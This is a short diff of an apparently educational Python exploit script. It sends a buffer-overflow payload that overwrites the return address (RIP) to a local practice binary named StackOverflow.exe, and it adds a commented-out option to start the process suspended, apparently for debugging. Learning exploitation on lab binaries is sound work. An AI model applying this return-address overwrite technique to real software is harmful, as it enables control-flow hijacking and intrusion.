@@ -14,7 +14,10 @@ payload = padding + rip_overwrite
 
 print(f"尝试跳过函数头，目标地址: {hex(secret_addr_adjusted)}")
 
+CREATE_SUSPENDED = 0x4
+
 p = subprocess.Popen(["StackOverflow.exe"], stdin=subprocess.PIPE)
+#p = subprocess.Popen(["StackOverflow.exe"], stdin=subprocess.PIPE,creationflags=CREATE_SUSPENDED)
 p.communicate(input=payload)
 
 
